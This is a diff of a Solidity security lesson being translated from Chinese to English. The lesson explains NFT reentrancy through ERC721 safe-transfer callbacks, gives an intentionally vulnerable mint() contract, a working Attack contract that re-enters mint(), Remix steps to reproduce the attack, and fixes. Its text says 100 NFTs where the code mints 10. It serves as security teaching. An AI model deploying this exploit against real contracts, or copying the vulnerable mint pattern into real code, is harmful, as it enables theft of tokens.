@@ -23,74 +23,74 @@ English translations by: [@to_22X](https://twitter.com/to_22X)
 
 -----
 
-这一讲，我们将介绍NFT合约的重入攻击漏洞，并攻击一个有漏洞的NFT合约，铸造100个NFT。
+In this lesson, we will discuss the reentrancy vulnerability in NFT contracts and attack a vulnerable NFT contract to mint 100 NFTs.
 
-## NFT重入风险
+## NFT Reentrancy Risk
 
-我们在[S01 重入攻击](https://github.com/AmazingAng/WTFSolidity/blob/main/S01_ReentrancyAttack/readme.md)中讲过，重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如`fallback`函数）循环调用合约，将合约中资产转走或铸造大量代币。转账NFT时并不会触发合约的`fallback`或`receive`函数，为什么会有重入风险呢？
+In [S01 Reentrancy Attack](https://github.com/AmazingAng/WTFSolidity/blob/main/S01_ReentrancyAttack/readme.md), we discussed that reentrancy attack is one of the most common attacks in smart contracts, where an attacker exploits contract vulnerabilities (e.g., `fallback` function) to repeatedly call the contract and transfer assets or mint a large number of tokens. When transferring NFTs, the contract's `fallback` or `receive` functions are not triggered. So why is there a reentrancy risk?
 
-这是因为NFT标准（[ERC721](https://github.com/AmazingAng/WTFSolidity/blob/main/34_ERC721/readme.md)/[ERC1155](https://github.com/AmazingAng/WTFSolidity/blob/main/40_ERC1155/readme.md)）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 `ERC721` 的 `safeTransferFrom()` 函数会调用目标地址的 `onERC721Received()` 函数，而黑客可以把恶意代码嵌入其中进行攻击。
+This is because the NFT standards ([ERC721](https://github.com/AmazingAng/WTFSolidity/blob/main/34_ERC721/readme.md)/[ERC1155](https://github.com/AmazingAng/WTFSolidity/blob/main/40_ERC1155/readme.md)) have introduced secure transfers to prevent users from accidentally sending assets to a black hole. If the recipient address is a contract, it will call the corresponding check function to ensure that it is ready to receive the NFT asset. For example, the `safeTransferFrom()` function of ERC721 calls the `onERC721Received()` function of the target address, and a hacker can embed malicious code in it to launch an attack.
 
-我们总结了 `ERC721` 和 `ERC1155` 有潜在重入风险的函数：
+We have summarized the functions in ERC721 and ERC1155 that have potential reentrancy risks:
 
 ![](./img/S16-1.png)
 
-## 漏洞例子
+## Vulnerable Example
 
-下面我们学习一个有重入漏洞的NFT合约例子。这是一个`ERC721`合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。
+Now let's learn an example of an NFT contract with a reentrancy vulnerability. This is an `ERC721` contract where each address can mint one NFT for free, but we can exploit the reentrancy vulnerability to mint multiple NFTs at once.
 
-### 漏洞合约
+### Vulnerable Contract
 
-`NFTReentrancy`合约继承了`ERC721`合约，它主要有 `2` 个状态变量，`totalSupply`记录NFT的总供给，`mintedAddress`记录已铸造过的地址，防止一个用户多次铸造。它主要有 `2` 个函数：
-- 构造函数: 初始化 `ERC721` NFT的名称和代号。
-- `mint()`: 铸造函数，每个用户可以免费铸造1个NFT。**注意：这个函数有重入漏洞！**
+The `NFTReentrancy` contract inherits from the `ERC721` contract. It has two main state variables: `totalSupply` to track the total supply of NFTs and `mintedAddress` to keep track of addresses that have already minted to prevent a user from minting multiple times. It has two main functions:
+- Constructor: Initializes the name and symbol of the `ERC721` NFT.
+- `mint()`: Mint function where each user can mint one NFT for free. **Note: This function has a reentrancy vulnerability!**
 
 ```solidity
 contract NFTReentrancy is ERC721 {
     uint256 public totalSupply;
     mapping(address => bool) public mintedAddress;
-    // 构造函数，初始化NFT合集的名称、代号
+    // Constructor to initialize the name and symbol of the NFT collection
     constructor() ERC721("Reentry NFT", "ReNFT"){}
 
-    // 铸造函数，每个用户只能铸造1个NFT
-    // 有重入漏洞
+    // Mint function, each user can only mint 1 NFT
+    // Contains a reentrancy vulnerability
     function mint() payable external {
-        // 检查是否mint过
+        // Check if already minted
         require(mintedAddress[msg.sender] == false);
-        // 增加total supply
+        // Increase total supply
         totalSupply++;
-        // mint
+        // Mint the NFT
         _safeMint(msg.sender, totalSupply);
-        // 记录mint过的地址
+        // Record the minted address
         mintedAddress[msg.sender] = true;
     }
 }
 ```
 
-### 攻击合约
+### Attack Contract
 
-`NFTReentrancy`合约的重入攻击点在`mint()`函数会调用`ERC721`合约中的`_safeMint()`，从而调用转入地址的`_checkOnERC721Received()`函数。如果转入地址的`_checkOnERC721Received()`包含恶意代码，就能进行攻击。
+The reentrancy vulnerability in the `NFTReentrancy` contract lies in the `mint()` function, which calls the `_safeMint()` function in the `ERC721` contract, which in turn calls the `_checkOnERC721Received()` function of the recipient address. If the recipient address's `_checkOnERC721Received()` contains malicious code, an attack can be performed.
 
-`Attack`合约继承了`IERC721Receiver`合约，它有 `1` 个状态变量`nft`记录了有漏洞的NFT合约地址。它有 `3` 个函数:
-- 构造函数: 初始化有漏洞的NFT合约地址。
-- `attack()`: 攻击函数，调用NFT合约的`mint()`函数并发起攻击。
-- `onERC721Received()`: 嵌入了恶意代码的ERC721回调函数，会重复调用`mint()`函数，并铸造10个NFT。
+The `Attack` contract inherits the `IERC721Receiver` contract and has one state variable `nft` that stores the address of the vulnerable NFT contract. It has three functions:
+- Constructor: Initializes the address of the vulnerable NFT contract.
+- `attack()`: Attack function that calls the `mint()` function of the NFT contract and initiates the attack.
+- `onERC721Received()`: ERC721 callback function with embedded malicious code that repeatedly calls the `mint()` function and mints 10 NFTs.
 
 ```solidity
-contract Attack is IERC721Receiver{
-    NFTReentrancy public nft; // 有漏洞的nft合约地址
+contract Attack is IERC721Receiver {
+    NFTReentrancy public nft; // Address of the NFT contract
 
-    // 初始化NFT合约地址
+    // Initialize the NFT contract address
     constructor(NFTReentrancy _nftAddr) {
         nft = _nftAddr;
     }
     
-    // 攻击函数，发起攻击
+    // Attack function to initiate the attack
     function attack() external {
         nft.mint();
     }
 
-    // ERC721的回调函数，会重复调用mint函数，铸造100个
+    // Callback function for ERC721, repeatedly calls the mint function to mint 10 NFTs
     function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
         if(nft.balanceOf(address(this)) < 10){
             nft.mint();
@@ -100,36 +100,36 @@ contract Attack is IERC721Receiver{
 }
 ```
 
-## Remix复现
+## Reproduce on `Remix`
 
-1. 部署`NFTReentrancy`合约。
-2. 部署`Attack`合约，参数填`NFTReentrancy`合约地址。
-3. 调用`Attack`合约的`attack()`函数发起攻击。
-4. 调用`NFTReentrancy`合约的`balanceOf()`函数查询`Attack`合约的持仓，可以看到持有`10`个NFT，攻击成功。
+1. Deploy the `NFTReentrancy` contract.
+2. Deploy the `Attack` contract with the `NFTReentrancy` contract address as the parameter.
+3. Call the `attack()` function of the `Attack` contract to initiate the attack.
+4. Call the `balanceOf()` function of the `NFTReentrancy` contract to check the holdings of the `Attack` contract. You will see that it holds `10` NFTs, indicating a successful attack.
 
 ![](./img/S16-2.png)
 
-## 预防方法
+## How to Prevent
 
-主要有两种办法来预防重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。
+There are two main methods to prevent reentrancy attack vulnerabilities: checks-effects-interactions pattern and reentrant guard.
 
-1. 检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的`mint()`函数:
+1. Checks-Effects-Interactions Pattern: This pattern emphasizes checking the state variables, updating the state variables (e.g., balances), and then interacting with other contracts. We can use this pattern to fix the vulnerable `mint()` function:
 
   ```solidity
-      function mint() payable external {
-          // 检查是否mint过
-          require(mintedAddress[msg.sender] == false);
-          // 增加total supply
-          totalSupply++;
-          // 记录mint过的地址
-          mintedAddress[msg.sender] = true;
-          // mint
-          _safeMint(msg.sender, totalSupply);
-      }
+    function mint() payable external {
+        // Check if already minted
+        require(mintedAddress[msg.sender] == false);
+        // Increase total supply
+        totalSupply++;
+        // Record the minted address
+        mintedAddress[msg.sender] = true;
+        // Mint the NFT
+        _safeMint(msg.sender, totalSupply);
+    }
   ```
 
-2. 重入锁：它是一种防止重入函数的修饰器（modifier）。建议直接使用OpenZeppelin提供的[ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
+2. Reentrant Lock: It is a modifier used to prevent reentrant functions. It is recommended to use [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) provided by OpenZeppelin.
 
-## 总结
+## Summary
 
-这一讲，我们介绍了NFT的重入攻击漏洞，并攻击了一个有漏洞的NFT合约，铸造了100个NFT。目前主要有两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。
+In this lesson, we introduced the reentrancy vulnerability in NFTs and attacked a vulnerable NFT contract by minting 100 NFTs. Currently, there are two main methods to prevent reentrancy attacks: the checks-effects-interactions pattern and the reentrant lock.
